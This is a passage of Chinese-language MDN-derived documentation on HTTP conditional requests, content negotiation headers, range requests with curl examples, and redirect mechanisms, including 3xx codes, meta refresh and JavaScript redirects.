基本原理很简单，但是这里有一个潜在的问题：如果要下载的资源在两次下载之间进行了修改，得到的数据范围就会对应该资源的两个不同的版本，那么最终获得的文件是损坏的。

为了防止这种情况的发生，需要使用条件式请求。对于范围请求来说，有两种方法可以实现这个目的。更灵活一些的方法是使用 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 和 [`If-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match) 首部，假如前置条件失败，服务器端会返回错误提示，然后客户端可以从头开始重新下载资源：

尽管这种方法行得通，但是它在文件发生变化的情况下增加了一次额外的请求/响应往返。这一点会影响性能。为此 HTTP 协议规定了一个特定的首部—— [`If-Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range) ——来避免这种情况的发生：

![The If-Range headers allows the server to directly send back the complete resource if it has been modified, no need to send a 412 error and wait for the client to re-initiate the download.](https://mdn.mozillademos.org/files/13741/HTTPResume4.png)

该方法更高效，但是缺乏一定的灵活性，因为条件值只能是实体标签。不过这种额外的灵活性很少会需要。

### [使用乐观锁避免更新丢失问题](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#使用乐观锁避免更新丢失问题)

对于 Web 应用的一项常见操作是远程更新文件。这在各种类型的文件系统以及版本控制软件中都很常见，但是任何允许远程存储资源的软件也都需要这样一个乐观锁机制。常见的 Web 站点，例如 wiki 系统或其他类型的内容管理系统（CMS），都存在这样的需求。

使用 [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 方法可以实现上述机制。客户端首先读取原始文件，然后进行修改，最后将它们推送到服务器上：

不幸的是，当把并发情况考虑在内的时候，事情变得有些不那么确定。当一个客户端在本地修改它新获得的资源副本的时候，另外一个客户端同样可以获取一份资源副本并进行同样的操作。接下来要发生的事情就不那么顺利了：当二者提交回服务器的时候，前一个客户端作出的修改会被第二个客户端的推送所覆盖，因为第二个客户端对于第一个客户端做出的修改一无所知。最终的结果则取决于获胜的一方，但是该结果不会通知给另一方。哪一个客户端作出的修改将会被保存下来，会由于它们提交的速度而有所不同；提交的速度则依赖于客户端及服务器端的性能，甚至是使用客户端进行编辑的人的表现。每一次的胜出者都会有所不同。这种情况被称作竞态条件（race condition ），会导致难以捉摸的情况的发生，并且难以探测和除错：

不存在解决这一问题而不打扰双方某一方的办法。然而，更新丢失问题以及竞态条件是需要避免的。我们希望获得可预测的结果，并且希望在更新操作被拒绝的时候客户端可以得到反馈。

条件式请求可以被用在**乐观锁算法**（大多数 wiki 系统和版本管理系统采用的是该算法）的实现上。其思路是，允许所有的客户端获得资源的副本，然后在本地进行编辑，通过只允许第一个客户端成功提交的方式来控制并发操作。其余的基于现今已过期版本的更新操作都会被拒绝：

这种方式的实现需要用到 [`If-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match) 或 [`If-Unmodified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since) 首部。假如实体标签与源头文件的实体标签不一致，或者源头文件在被获取副本之后经过了修改，那么此次变更请求就会被拒绝，收到 [`412`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412) `Precondition Failed` 的错误提示。之后就需要依靠客户端来处理该错误了：或者通知用户重新开始（基于最新的版本），或者是给用户展示两个版本之间的**差异**，辅助他们决定要保留哪些变更。

### [处理资源的首次上传问题](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#处理资源的首次上传问题)

资源的首次上传问题是前面所描述的情况的一个极端情况。与任何资源更新问题一样，当两个客户端在大致相同的时间进行上传操作的时候，就会遇到竞态条件。为了防止这种情况的发生，可以使用条件式请求：添加 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 首部，并将其值设置为`'*'`, 表示任意实体标签。当且仅当资源先前并不存在的情况下请求的操作才会成功执行：

----

# 内容协商

在 [HTTP](https://developer.mozilla.org/en-US/docs/Glossary/HTTP) 协议中，内容协商是这样一种机制，通过为同一 URI 指向的资源提供不同的展现形式，可以使用户代理选择与用户需求相适应的最佳匹配（例如，文档使用的自然语言，图片的格式，或者内容编码形式）。

## [内容协商的基本原则](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#内容协商的基本原则)

一份特定的文件称为一项资源。当客户端获取资源的时候，会使用其对应的 URL 发送请求。服务器通过这个 URL 来选择它指向的资源的某一变体——每一个变体称为一种展现形式——然后将这个选定的展现形式返回给客户端。整个资源，连同它的各种展现形式，共享一个特定的 URL 。当一项资源被访问的时候，特定展现形式的选取是通过内容协商机制来决定的，并且客户端和服务器端之间存在多种协商方式。

![img](https://mdn.mozillademos.org/files/13789/HTTPNego.png)

最佳展现形式的选取可以通过两种机制实现：

- 客户端设置特定的 [HTTP 首部](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) （又称为服务端驱动型内容协商机制或者主动协商机制）；这是进行内容协商的标准方式；
- 服务器返回 [`300`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300) (Multiple Choices) 或者 [`406`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/406) (Not Acceptable) [HTTP 状态码](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) （又称为代理驱动型协商机制或者响应式协商机制）；这种方式一般用作备选方案。

随着时间的推移，也有其他一些内容协商的提案被提出来，比如透明内容协商以及 Alternates 首部。但是它们都没有获得人们的认可从而被遗弃。

## [服务端驱动型内容协商机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#服务端驱动型内容协商机制)

在服务端驱动型协商机制或者主动协商机制中，浏览器（或者其他任何类型的用户代理）会随同 URL 发送一系列的消息头。这些消息头描述了用户倾向的选择。服务器则以此为线索，通过内部算法来选择最佳方案提供给客户端。相关算法与具体的服务器相关，并没有在规范中进行规定。例如这里有一份 [Apache 2.2 服务器的内容协商算法](https://httpd.apache.org/docs/2.2/en/content-negotiation.html#algorithm)。

HTTP/1.1 规范指定了一系列的标准消息头用于启动服务端驱动型内容协商 （[`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)、[`Accept-Charset`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Charset)、 [`Accept-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Encoding)、[`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)）。尽管严格来说  [`User-Agent`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent) 并不在此列，有时候它还是会被用来确定给客户端发送的所请求资源的特定展现形式，不过这种做法不提倡使用。服务器会使用 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 消息头来说明实际上哪些消息头被用作内容协商的参考依据（确切来说是与之相关的响应消息头），这样可以使[缓存](https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching)的运作更有效。

除此之外，有一个建议向可供选择的列表中增加更多的消息头的实验性提案，称为“客户端示意”（client hints）。客户端示意机制可以告知运行用户代理的设备类型（例如，是桌面计算机还是移动设备）。

即便服务端驱动型内容协商机制是最常用的对资源特定展现形式进行协商的方式，它存在如下几个缺点：

- 服务器对浏览器并非全知全能。即便是有了客户端示意扩展，也依然无法获取关于浏览器能力的全部信息。与客户端进行选择的代理驱动型内容协商机制不同，服务器端的选择总是显得有点武断。
- 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）。
- 因为给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。

### [`Accept` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept_首部)

[`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept) 首部列举了用户代理希望接收的媒体资源的 MIME 类型。其中不同的 MIME 类型之间用逗号分隔，同时每一种 MIME 类型会配有一个品质因数（quality factor），该参数明确了不同 MIME 类型之间的相对优先级。

[`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept) 首部的值由浏览器或其他类型的用户代理确定，并且会由于上下文环境的不同而不同，比如在获取 HTML 页面、图片文件、视频文件或者是脚本文件的时候，无论是通过在地址栏中输入资源地址来获取还是通过 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img)、[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video) 或 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio) 元素引用都是不一样的。浏览器可以自由使用它们认为最为合适的首部值；这里有一份[常见浏览器 Accept 首部默认值](https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation/List_of_default_Accept_values)的完整列表。

### [`Accept-CH` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept-ch_首部experimental_inline)

> 这是被称为“客户端示意”（Client Hints）的**实验性**技术方案的一部分，目前仅在 Chrome 46 及以后的版本中得到了实现。

该实验性首部 [`Accept-CH`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-CH) 列出了服务器可以用来选择合适响应的配置数据。合法值如下：

| Value            | Meaning                                                      |
| :--------------- | :----------------------------------------------------------- |
| `Device-Memory`  | 标明客户端设备的 RAM 内存大小。该值是个估计值，设备的实际内存值会向2的次方取整，且除以1024。比如512MB的内存对应的值为0.5。 |
| `DPR`            | 标明客户端所在设备的像素比率。                               |
| `Viewport-Width` | 标明用 CSS 像素数值表示的布局视口（layout viewport）宽度。   |
| `Width`          | 标明用物理像素值表示的资源宽度（换句话说就是一张图片的固有大小）。 |

### [`Accept-Charset` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept-charset_首部)

[`Accept-Charset`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Charset)首部用于告知服务器该客户代理可以理解何种形式的字符编码。按照传统，不同地区用户使用的的浏览器会被赋予不同的值，比如说西欧地区用户使用的浏览器中，该首部的值可能会是 `ISO-8859-1,utf-8;q=0.7,*;q=0.7` 。

如今 UTF-8 编码已经得到了广泛的支持，成为首选的字符编码类型，[为了通过减少基于配置信息的信息熵来更好地保护隐私信息](https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy)， 大多数浏览器会将 Accept-Charset 首部移除：Internet Explorer 8、Safari 5、Opera 11 以及 Firefox 10 都已经不再发送该首部。

### [`Accept-CH-Lifetime` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept-ch-lifetime_首部experimental_inline)

该实验性首部 [`Accept-CH-Lifetime`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-CH-Lifetime) 与 Accept-CH 首部中的 Device-Memory 值一同使用，标明设备应该与服务器共享指定大小的内存的时间。单位为毫秒。该首部为可选的。

### [`Accept-Encoding` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept-encoding_首部)

[`Accept-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Encoding) 首部明确说明了（接收端）可以接受的内容编码形式（所支持的压缩算法）。该首部的值是一个Q因子清单（例如 br, gzip;q=0.8），用来提示不同编码类型值的优先级顺序。默认值 identity 则优先级最低（除非声明为其他优先级）。

将 HTTP 消息进行压缩是一种最重要的提升 Web 站点性能的方法。该方法会减小所要传输的数据量的大小，节省可用带宽。浏览器总是会发送该首部，服务器则应该配置为接受它，并且采用一定的压缩方案。

### [`Accept-Language` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#accept-language_首部)

[`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language) 首部用来提示用户期望获得的自然语言的优先顺序。该首部的值是一个Q因子清单（例如 "de, en;q=0.7"）。用户代理的图形界面上所采用的语言通常可以用来设置为默认值，但是大多数浏览器允许设置不同优先级的语言选项。

由于[基于配置信息的信息熵](https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy)的增加，修改后的值可以用作识别用户的指纹，所以不建议对其进行修改，不过这样的话 Web 站点也就不能依赖该值来揭示用户的真实期望。站点设计者不能过度热衷于通过这个首部来进行语言检测，因为它可能会导致糟糕的用户体验：

- 站点设计者应该总是提供一种方式来使用户能够覆盖由服务器端选择的语言，例如在页面上提供一个用于语言选择的按钮。大多数用户代理会为 Accept-Language 首部提供一个默认值，该值采用的是用户界面的显示的语言，通常终端用户不能对其进行修改，或者是不知道该怎么修改，或者是无法进行修改，例如在网络咖啡厅里的情形。
- 一旦用户覆盖了服务器端选择的语言选项，站点就不应该再使用语言检测技术，而应该忠于明确选择的语言选项。换句话说，只有站点的入口页面应该使用这个首部来选择合适的语言。

### [`User-Agent` 首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#user-agent_首部)

[`User-Agent`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent) 首部可以用来识别发送请求的浏览器。该字符串中包含有用空格间隔的**产品标记符**及**注释**的清单。

**产品标记符**由产品名称、后面紧跟的 '/' 以及产品版本号构成，例如 Firefox/4.0.1 。用户代理可以随意添加多少产品标记符都可以。**注释**是一个用括号分隔的自由形式的字符串。显然括号本身不能用在该字符串中。规范没有规定注释的内部格式，不过一些浏览器会把一些标记符放置在里面，不同的标记符之间使用 ';' 分隔。

### [`Vary` 响应首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#vary_响应首部)

与前面列举的 Accept-* 形式的由客户端发送的首部相反，[`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 首部是由服务器在响应中发送的。它标示了服务器在服务端驱动型内容协商阶段所使用的首部清单。这个首部是必要的，它可以用来通知缓存服务器决策的依据，这样它可以进行复现，使得缓存服务器在预防将错误内容提供给用户方面发挥作用。

特殊值 '*' 意味着在服务端驱动型内容协商过程中同时采纳了未在首部中传递的信息来选择合适的内容。

Vary 首部是在 HTTP 协议的 1.1 版本中新添加的，而为了使缓存服务器恰当地工作，这个首部是必要的。缓存服务器为了能够与服务端驱动型内容协商机制协同工作，需要知道服务器选择传送内容的决策依据。这样的话，缓存服务器就可以重复该算法，直接提供恰当的内容，而不需要向服务器发送更多的请求。显然，通配符 '*' 阻碍了缓存机制发挥作用，因为缓存服务器并不知道该通配符究竟指代哪些元素。

## [代理驱动型内容协商机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Content_negotiation#代理驱动型内容协商机制)

服务端驱动型内容协商机制由于一些缺点而为人诟病——它在规模化方面存在问题。在协商机制中，每一个特性需要对应一个首部。如果想要使用屏幕大小、分辨率或者其他方面的特性，就需要创建一个新的首部。而且在每一次请求中都必须发送这些首部。在首部很少的时候，这并不是问题，但是随着数量的增多，消息体的体积会导致性能的下降。带有精确信息的首部发送的越多，信息熵就会越大，也就准许了更多 HTTP 指纹识别行为，以及与此相关的隐私问题的发生。

从 HTTP 协议制定之初，该协议就准许另外一种协商机制：代理驱动型内容协商机制，或称为响应式协商机制。在这种协商机制中，当面临不明确的请求时，服务器会返回一个页面，其中包含了可供选择的资源的链接。资源呈现给用户，由用户做出选择。

不幸的是，HTTP 标准没有明确指定提供可选资源链接的页面的格式，这一点阻碍了将这一过程无痛自动化。除了退回至服务端驱动型内容协商机制外，这种自动化方法几乎无一例外都是通过脚本技术来完成的，尤其是 JavaScript 重定向技术：在检测了协商的条件之后，脚本会触发重定向动作。另外一个问题是，为了获得实际的资源，需要额外发送一次请求，减慢了将资源呈现给用户的速度。

---

# HTTP请求范围

HTTP 协议范围请求允许服务器只发送 HTTP 消息的一部分到客户端。范围请求在传送大的媒体文件，或者与文件下载的断点续传功能搭配使用时非常有用。

## [检测服务器端是否支持范围请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#检测服务器端是否支持范围请求)

假如在响应中存在 [`Accept-Ranges`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges) 首部（并且它的值不为 “none”），那么表示该服务器支持范围请求。例如，你可以使用 cURL 发送一个 [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD) 请求来进行检测。

```bash
curl -I http://i.imgur.com/z4d4kWk.jpg

HTTP/1.1 200 OK
...
Accept-Ranges: bytes
Content-Length: 146515
```

在上面的响应中， `Accept-Ranges: bytes` 表示界定范围的单位是 bytes 。这里 [`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length) 也是有效信息，因为它提供了要检索的图片的完整大小。

如果站点未发送 `Accept-Ranges` 首部，那么它们有可能不支持范围请求。一些站点会明确将其值设置为 "none"，以此来表明不支持。在这种情况下，某些应用的下载管理器会将暂停按钮禁用。

```
curl -I https://www.youtube.com/watch?v=EwTZ2xpQwpA

HTTP/1.1 200 OK
...
Accept-Ranges: none
```

## [从服务器端请求特定的范围](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#从服务器端请求特定的范围)

假如服务器支持范围请求的话，你可以使用 [`Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range) 首部来生成该类请求。该首部指示服务器应该返回文件的哪一或哪几部分。

### [单一范围](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#单一范围)

我们可以请求资源的某一部分。这次我们依然用 cURL 来进行测试。"-H" 选项可以在请求中追加一个首部行，在这个例子中，是用 Range 首部来请求图片文件的前 1024 个字节。

```bash
curl http://i.imgur.com/z4d4kWk.jpg -i -H "Range: bytes=0-1023"
```

这样生成的请求如下：

```http
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
```

服务器端会返回状态码为 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206) `Partial Content` 的响应：

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
```

在这里，[`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length) 首部现在用来表示先前请求范围的大小（而不是整张图片的大小）。[`Content-Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Range) 响应首部则表示这一部分内容在整个资源中所处的位置。

### [多重范围](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#多重范围)

Range头部也支持一次请求文档的多个部分。请求范围用一个逗号分隔开。

```bash
curl http://www.example.com -i -H "Range: bytes=0-50, 100-150"
```

服务器返回206 Partial Content状态码和Content-Type：multipart/byteranges; boundary=3d6b6a416f9b5头部，Content-Type：multipart/byteranges表示这个响应有多个byterange。每一部分byterange都有他自己的Content-type头部和Content-Range，并且使用boundary参数对body进行划分。

```http
HTTP/1.1 206 Partial Content
Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
Content-Length: 282

--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 0-50/1270

<!doctype html>
<html>
<head>
    <title>Example Do
--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 100-150/1270

eta http-equiv="Content-type" content="text/html; c
--3d6b6a416f9b5--
```

### [条件式范围请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#条件式范围请求)

当（中断之后）重新开始请求更多资源片段的时候，必须确保自从上一个片段被接收之后该资源没有进行过修改。

The [`If-Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range) 请求首部可以用来生成条件式范围请求：假如条件满足的话，条件请求就会生效，服务器会返回状态码为 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206) `Partial `的响应，以及相应的消息主体。假如条件未能得到满足，那么就会返回状态码为 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) `OK` 的响应，同时返回整个资源。该首部可以与  [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 验证器或者 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 一起使用，但是二者不能同时使用。

```
If-Range: Wed, 21 Oct 2015 07:28:00 GMT 
```

## [范围请求的响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#范围请求的响应)

与范围请求相关的有三种状态：

- 在请求成功的情况下，服务器会返回 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206) `Partial Content` 状态码。
- 在请求的范围越界的情况下（范围值超过了资源的大小），服务器会返回 [`416`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/416) `Requested Range Not Satisfiable` （请求的范围无法满足） 状态码。
- 在不支持范围请求的情况下，服务器会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) `OK` 状态码。

## [与分块传输编码的对比](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Range_requests#与分块传输编码的对比)

[`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 首部允许分块编码，这在数据量很大，并且在请求未能完全处理完成之前无法知晓响应的体积大小的情况下非常有用。服务器会直接把数据发送给客户端而无需进行缓冲或确定响应的精确大小——后者会增加延迟。范围请求与分块传输是兼容的，可以单独或搭配使用。

---

# HTTP 的重定向

URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects）来执行此类操作。

重定向可实现许多目标：

- 站点维护或停机期间的临时重定向。
- 永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。
- 上传文件时的表示进度的页面。

## [原理](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#原理)

在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。

浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载；大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。


![img](https://mdn.mozillademos.org/files/13785/HTTPRedirect.png)

不同类型的重定向映射可以划分为三个类别：

1. [永久重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections$edit#Permanent_redirections)
2. [临时重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections$edit#Temporary_redirections)
3. [特殊重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections$edit#Special_redirections)

### [永久重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#永久重定向)

这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。

| 编码  | 含义               | 处理方法                                                     | 典型应用场景                                             |
| :---- | :----------------- | :----------------------------------------------------------- | :------------------------------------------------------- |
| `301` | Moved Permanently  | [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法不会发生变更，其他方法有可能会变更为 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法。[[1\]](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#attr1) | 网站重构。                                               |
| `308` | Permanent Redirect | 方法和消息主体都不发生变化。                                 | 网站重构，用于非GET方法。(with non-GET links/operations) |

[1] 该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 308 状态码被创建用来消除在使用非 GET 方法时的歧义行为。

### [临时重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#临时重定向)

有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。

搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。

| 编码  | 含义                 | 处理方法                                                     | 典型应用场景                                                 |
| :---- | :------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `302` | `Found`              | [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法不会发生变更，其他方法有可能会变更为 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法。[[2\]](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#attr2) | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。 |
| `303` | `See Other`          | [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 方法不会发生变更，其他方法会**变更**为 GET 方法（消息主体会丢失）。 | 用于[`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 或 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。 |
| `307` | `Temporary Redirect` | 方法和消息主体都不发生变化。                                 | 由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。 |

[2] 该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。

### [特殊重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#特殊重定向)

除了上述两种常见的重定向之外，还有两种特殊的重定向。[`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 [`300`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300) （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。

| 编码  | 含义              | 典型应用场景                                                 |
| :---- | :---------------- | :----------------------------------------------------------- |
| `300` | `Multiple Choice` | 不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 [`Link`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link) 头部加入机器可读的 `rel=alternate` |
| `304` | `Not Modified`    | 发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。 |

## [设定重定向映射的其他方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#设定重定向映射的其他方法)

**HTTP 协议中重定向机制**并非唯一的重定向映射的方式。其他两种方法包括：

1. 借助 HTML 的 meta 元素的 HTML 重定向机制
2. 借助 [DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) 的 JavaScript 重定向机制。

### [HTML 重定向机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#html_重定向机制)

HTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/head) 部分添加一个 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta) 元素，并将其 [`http-equiv`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta#attr-http-equiv) 属性的值设置为 `refresh` 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。

```html
<head>
  <meta http-equiv="Refresh" content="0; URL=http://example.com/" />
</head>
```

[`content`](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes#attr-content) 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。

显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。

注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。

### [JavaScript 重定向机制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#javascript_重定向机制)

在 JavaScript 中，重定向机制的原理是设置 [`window.location`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/location) 的属性值，然后加载新的页面。

```js
window.location = "http://example.com/";
```

与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。

### [优先级](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#优先级)

由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：

1. HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。
2. HTML 的重定向机制 (<meta>) 会在 HTTP 协议重定向机制未设置的情况下触发。
3. JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。

**任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制**，而不要使用(<meta>)标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他噩梦的发生。

---

## [应用场景](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#应用场景)

有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会带来性能上的开销。

### [域名别称](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Redirections#域名别称)

理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。

在以下几种情况下可以使用域名别称：

